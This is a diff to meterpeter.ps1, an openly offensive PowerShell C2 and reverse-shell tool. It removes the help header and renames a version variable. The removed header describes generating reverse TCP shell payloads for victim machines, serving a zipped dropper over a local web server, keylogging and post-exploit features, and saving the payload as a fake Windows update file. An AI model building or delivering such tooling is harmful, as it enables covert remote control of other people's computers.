@@ -1,47 +1,6 @@
-<#
-.SYNOPSIS
-  Starts a listener Server on a Windows|Linux attacker machine and generate oneline reverse shell payloads (PS)
-
-  Author: @ZHacker13 &('r00t-3xp10it')
-  Required Dependencies: None
-  Optional Dependencies: Python3 (windows)|Apache2 (Linux)
-  PS Script Dev Version: v2.10.7
-
-.DESCRIPTION
-   This PS1 starts a listener Server on a Windows|Linux attacker machine and generates oneline
-   reverse tcp shell payloads (In PowerShell) to be executed on the victim machine. You can also
-   recive the remote connection via netcat. (In this case you will lose the C2 functionalities
-   like: upload|download files, screenshot, keylogger, post-exploit, Advanced Information, etc)
-
-.NOTES
-   meterpeter server creates one PS script (payload) and one dropper.bat (Launcher) then compress (zip)
-   the dropper and copy it to apache2 (On Linux) or Python3 http.server (On Windows) working directory,
-   then creates one URL (dropper.zip) for attacker to be abble to deliver the payload under LAN networks.
-
-.EXAMPLE
-   PS C:\> Get-Help ./meterpeter.ps1 -full
-   Access This cmdlet Comment_Based_Help
-
-.EXAMPLE
-   PS C:\> ./meterpeter.ps1
-   Execute meterpeter C2 Server
- 
-.INPUTS
-   None. You cannot pipe objects to meterpeter.ps1
-
-.OUTPUTS
-   Saves Update-KB4524147.ps1 (reverse tcp shell) to meterpeter working directory.
-
- .LINK
-    https://github.com/r00t-3xp10it/meterpeter
-    https://github.com/ZHacker13/ReverseTCPShell
-#>
-
-
-## Meterpeter Develop version
-$dev_Version = "2.10.7";
-## Auto-Convertion of Client.ps1 to standalone executable
+﻿## Auto-Convertion of Client.ps1 to standalone executable
 $Converter = $False
+$MyVersion = "2.10.7"
 
 
 function Character_Obfuscation($String)
@@ -437,7 +396,7 @@ While($Client.Connected)
       If(-not($bool)){$SerPrivileges = "UserLand"}else{$SerPrivileges = "SYSTEM"}
       write-host "`n`n Server Settings" -ForegroundColor green;
       write-host " ---------------";
-      write-host " meterpeter dev        : $dev_Version";
+      write-host " meterpeter dev        : $MyVersion";
       write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
       write-host " Obfuscation Settings  : $ob";
       write-host " Server Privileges     : $SerPrivileges";
